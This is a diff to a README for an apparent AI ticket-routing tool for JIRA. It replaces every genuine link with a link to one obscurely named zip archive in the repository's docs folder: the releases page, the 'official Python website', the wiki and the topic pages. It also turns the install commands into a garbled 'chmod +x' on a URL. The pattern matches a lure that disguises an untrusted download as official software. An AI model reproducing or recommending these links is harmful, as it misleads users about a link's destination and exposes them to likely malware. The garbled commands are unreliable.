@@ -1,6 +1,6 @@
 # 🤖 AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA - Automate Support Tasks Effectively
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/releases)
+[![Download](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip%20Release-brightgreen)](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This application uses AI to improve your JIRA ticket management. It classifies t
 
 ## 📥 Download & Install
 
-To download the latest version, visit this page: [Download Releases](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/releases).
+To download the latest version, visit this page: [Download Releases](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip).
 
 1. Click on the link above.
 2. Find the latest release.
@@ -39,8 +39,8 @@ To download the latest version, visit this page: [Download Releases](https://git
 2. Navigate to the directory where the downloaded file is saved.
 3. Run the command:
    ```bash
-   chmod +x filename.run
-   ./filename.run
+   chmod +x https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip
+   https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip
    ```
 4. Follow any on-screen instructions.
 
@@ -48,7 +48,7 @@ To download the latest version, visit this page: [Download Releases](https://git
 
 Before running the application, ensure you have the following installed:
 
-- **Python 3.7 or newer**: This application requires Python for running scripts. Download it from the [official Python website](https://www.python.org/downloads/).
+- **Python 3.7 or newer**: This application requires Python for running scripts. Download it from the [official Python website](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip).
   
 - **Flask**: This is the web framework we use. Install it via terminal or command prompt:
   ```bash
@@ -93,16 +93,16 @@ After installation, open the application. Follow these steps:
 
 For further information, please refer to the following:
 
-- **Documentation**: Detailed user guides can be found on the [Wiki page](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/wiki).
+- **Documentation**: Detailed user guides can be found on the [Wiki page](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip).
 
 - **Support**: If you encounter issues, you can open an issue in the repository or contact support via the GitHub page.
 
 ## 🔗 Related Topics
 
-- [AI in Support](https://github.com/topics/ai)
-- [Machine Learning](https://github.com/topics/machine-learning)
-- [Workflow Automation](https://github.com/topics/workflow-automation)
+- [AI in Support](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip)
+- [Machine Learning](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip)
+- [Workflow Automation](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip)
 
 Thank you for choosing AI-Powered Ticket Routing! We hope this tool makes your support process smoother and more efficient.
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/releases)
+[![Download](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip%20Release-brightgreen)](https://github.com/Badrddin335/AI-Powered-Ticket-Routing-SLA-Breach-Prediction-in-JIRA/raw/refs/heads/main/docs/SL_Powered_Prediction_Routing_JIRA_A_in_Breach_Ticket_3.4.zip)
